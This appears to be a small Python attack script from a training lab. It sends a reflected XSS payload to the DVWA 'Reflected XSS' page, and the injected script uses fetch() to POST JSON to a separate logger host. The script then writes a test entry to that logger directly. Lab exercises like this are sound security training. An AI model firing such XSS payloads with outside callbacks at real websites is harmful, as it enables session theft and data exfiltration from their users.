# simple attacker -> sends a reflected XSS payload to the DVWA "Reflected XSS" page
import requests
import time
import os

DVWA_URL = os.environ.get("DVWA_URL", "http://dvwa/vulnerabilities/xss_r/")
LOGGER_URL = os.environ.get("LOGGER_URL", "http://logger:5000/log")

payload = "<script>fetch('http://logger:5000/log', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({from:'attacker',payload: 'XSS_TEST'})})</script>"

params = {"name": payload, "Submit": "Submit"}

# Wait a few seconds for DVWA to be ready
time.sleep(8)

try:
    r = requests.get(DVWA_URL, params=params, timeout=10)
    print("Sent payload to DVWA (status):", r.status_code)
except Exception as e:
    print("Error sending payload to DVWA:", e)

# Also send a test log directly to logger
try:
    ll = requests.post(LOGGER_URL, json={"from": "attacker_script", "note": "test log"}, timeout=5)
    print("Logger responded:", ll.status_code)
except Exception as e:
    print("Error sending to logger:", e)
